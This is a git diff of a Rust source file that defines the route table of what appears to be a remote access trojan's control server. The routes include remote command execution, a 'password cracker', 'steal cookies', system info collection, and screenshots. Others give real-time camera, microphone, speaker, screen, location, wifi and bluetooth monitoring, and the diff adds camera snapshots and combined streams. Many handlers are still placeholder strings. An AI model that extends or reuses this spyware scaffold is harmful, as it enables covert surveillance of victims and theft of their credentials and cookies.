@@ -12,7 +12,7 @@ use std::sync::{Arc, Mutex};
 
 pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
     Router::new()
-        .route("/", get("login with username and password"))
+        .route("/login", get("login with username and password"))
         .route("/set", get("update username & password"))
         .route("/pswd", post("password cracker"))
         .route("/exec", post(exec::exec_cmd))
@@ -21,10 +21,14 @@ pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
         .route("/cookie", post("steal cookies"))
         .route("/fetch", post(fetch::fetch_sys_info))
         // routes for real time data
-        .route("/skrin", post(scrn::screenshot))
-        .route("/kamera", post("real time camera"))
+        .route("/skrin/snap", post(scrn::screenshot))
+        .route("/skrin", post("real time screen"))
         .route("/spikar", post("real time speaker"))
+        .route("/op", post("real time screen & speaker"))
+        .route("/kamera/snap", post("camera snapshot"))
+        .route("/kamera", post("real time camera"))
         .route("/maik", post("real time mic"))
+        .route("/ip", post("real time camera & mic"))
         .route("/lokesan", post("real time location"))
         .route("/oaifai", post("real time wifi"))
         .route("/blootooth", post("real time bluetooth"))
